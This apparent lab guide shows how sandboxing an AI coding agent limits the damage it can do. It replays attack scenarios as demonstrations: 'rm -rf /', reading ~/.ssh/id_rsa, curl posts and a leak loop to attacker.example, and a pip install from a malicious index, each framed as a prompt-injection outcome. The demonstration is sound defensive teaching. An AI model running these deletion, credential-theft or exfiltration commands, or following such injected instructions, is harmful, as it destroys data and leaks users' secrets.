# Section 04 — Pillar 1: Blast Radius Test

> 🎯 **Goal.** Re-run the Lab 1 horror-story scenarios — but this time the agent is inside a sandbox with policies applied. Watch the blast radius collapse from "your entire user account" to "this one project directory."
>
> 👥 **Audience.** Developers, architects, and great as a leadership demo.
> ⏱ **~10 minutes.**

## Pre-built helper

This labspace repo includes `blast-radius.sh` at the repo root — a guided script that walks you through the blast-radius scenarios with prompts and expected outcomes. You can either follow the lab steps below manually or run `bash blast-radius.sh` to step through the same scenarios interactively.

## The premise

In Lab 1 we showed what an unconstrained agent could read and reach. In Lab 2 we set up the sandbox with policies. Now we replay the same horror scenarios — but **the agent is running inside the sandbox** — and observe the blast radius.

## Step 1 — Set up the test workspace

```bash
mkdir -p ~/blast-radius-test
cd ~/blast-radius-test
cp <path-to-labspace>/./project/horror-story-agent/inventory.sh .
```

## Step 2 — Run the inventory inside the sandbox

```bash
sbx run --agent shell --workspace ./
# Inside the sandbox:
bash inventory.sh
exit
```

Compare against the Lab 1 output. You should now see:

- **Filesystem section** — only files inside the mounted workspace are visible. Everything else (`~/.ssh`, `~/.aws`, `.env` files elsewhere) returns `[NOT FOUND]` because **they don't exist from the sandbox's point of view**. Not "permission denied" — *don't exist*. The mount layer makes them invisible.
- **Network section** — only allowlisted hosts are `[REACHABLE]`. Slack webhooks, Discord, pastebin — all `[BLOCKED]`. Not "connection refused" — *blocked at the proxy*.

That's the blast radius. **What the agent can touch is now exactly what you defined, nothing more.**

## Step 3 — Try four real attack patterns

For each scenario below, observe what happens inside the sandbox.

### Scenario A — "Clean up the project"

The classic destructive command. Imagine a prompt injection that convinces the agent to "clean up" what it thinks is the project root.

Inside the sandbox:

```bash
sbx shell
rm -rf /
# ...this errors out; the sandbox filesystem is ephemeral and tiny
exit
```

Then back on your host — your real `~/` is untouched. The sandbox was destroyed, your machine wasn't. Ephemerality is the safety net.

### Scenario B — Prompt injection trying to exfiltrate creds

Simulate what an injection payload would do — read a credential, post it to an attacker.

Inside the sandbox:

```bash
sbx shell
cat ~/.ssh/id_rsa 2>&1 | head -5
# Expected: cat: /root/.ssh/id_rsa: No such file or directory
#           (or the sandbox user's home — either way, your real key isn't here)

curl -sS -X POST https://attacker.example/collect -d "test" 2>&1 | head -5
# Expected: policy-denied error, not a real HTTP request
exit
```

### Scenario C — Malicious tool installation

A prompt-injection asks the agent to install a "dependency" from a non-allowlisted registry.

Inside the sandbox:

```bash
sbx shell
pip install --index-url https://malicious-pypi.example fakepackage
# Expected: network policy denies the registry
exit
```

### Scenario D — Silent breach attempt

Suppose the agent decides to slowly drip data to an external host.

Inside the sandbox:

```bash
sbx shell
for i in 1 2 3; do
  curl -sS "https://attacker.example/?leak=$i" -o /dev/null
  sleep 1
done
# Expected: every request blocked at the proxy
exit
```

## Step 4 — What just happened

| Lab 1 (no sandbox) | Lab 3 (sandbox + policy) |
|--------------------|--------------------------|
| Read every SSH key in `~/.ssh` | `~/.ssh` not mounted — invisible |
| Reach Slack webhook | Network proxy denies |
| Install package from any registry | npm/PyPI allowed; others denied |
| Run `rm -rf` on host | Sandbox FS is ephemeral; host untouched |

**Same agent, same prompts, same code. Different blast radius.** That's the value prop in one slide — and what landed hardest with Bosch leadership at DigiFusion.

## Step 5 — One important caveat

The local policy you set in Lab 2 only protects **this developer's machine**. The next developer down the hall has a different `sbx policy ls`. Different allowlist, different deny rules, different blast radius.

That's why the next lab is about **org governance** — the same policy defined once in the Admin Console, propagated to every developer in the org, enforced identically everywhere.

---

→ Next: **[Section 05 — Org Governance Walkthrough](05-org-governance.md)**
